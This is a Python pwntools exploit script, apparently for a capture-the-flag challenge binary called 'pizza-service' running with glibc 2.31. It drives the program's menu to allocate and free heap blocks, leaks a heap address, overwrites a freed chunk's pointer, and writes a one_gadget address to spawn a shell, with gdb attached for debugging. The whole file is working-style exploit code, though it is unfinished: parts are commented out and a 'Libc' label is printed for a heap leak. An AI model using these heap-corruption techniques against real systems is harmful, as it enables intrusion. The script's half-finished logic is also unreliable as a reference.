from pwn import *
import struct


def get_one_gadgets(libc):
	args = ["one_gadget", "-r"]
	if len(libc) == 40 and all(x in string.hexdigits for x in libc.hex()):
		args += ["-b", libc.hex()]
	else:
		args += [libc]
	return [int(offset) for offset in subprocess.check_output(args).decode('ascii').strip().split()]


binary = ELF('pizza-service')
libc = ELF('./libc-2.31.so')
io = process("./pizza-service")

io.recv()
io.sendline("AAAAAAA")

#addd first block
io.sendline("1")
io.recv()
io.sendline("1")
io.recv()
io.sendline("y")
io.recv()
io.sendline("BBBBB")
io.recv()

#second block
io.sendline("1")
io.recv()
io.sendline("1")
io.recv()
io.sendline("y")
io.recv()
io.sendline("CCCCCCC")
io.recv()

#freee
io.sendline("4")
io.recv()
io.sendline("1")
io.recv()
io.sendline("4")
io.recv()
io.sendline("2")
io.recv()


io.sendline("2")
io.recv()
io.sendline("1")
io.recv()
io.sendline("1")
io.recv()
io.sendline("y")


io.recv()
io.sendline("AAAAAAAAAAA")

#io.sendline((p64(0x38)+ p64(0x00) + "ddddddddddddddddddddddddddddddddDD"))
io.recv()



io.sendline("3")
io.sendline("2")
heap_leak = struct.unpack('Q',io.recv()[155:160].strip().ljust(8,'\x00'))[0]

print(hex(heap_leak))

io.sendline("2")
io.recv()
io.sendline("1")
io.recv()
io.sendline("1")
io.recv()
io.sendline("y")

io.sendline(p64(0x36)+p64(heap_leak))


"""
io.recv()
io.sendline((p64(0x38)+ p64(0x00) + p64(heap_leak)))
io.recv()
"""

"""
print("Libc: {}".format(hex(heap_leak)))
free_hook = heap_leak - libc.symbols['__free_hook']
print("Free_hook:{}".format(hex(free_hook)))
"""

io.sendline("1")
io.recv()
io.sendline("1")
io.recv()
io.sendline("y")
io.recv()
io.sendline("eeeeeeeeeee")



io.sendline("1")
io.recv()
io.sendline("1")
io.recv()
io.sendline("y")
io.recv()

io.sendline(p64((get_one_gadgets("./libc-2.31.so")[1])))

gdb.attach(io)

io.interactive()






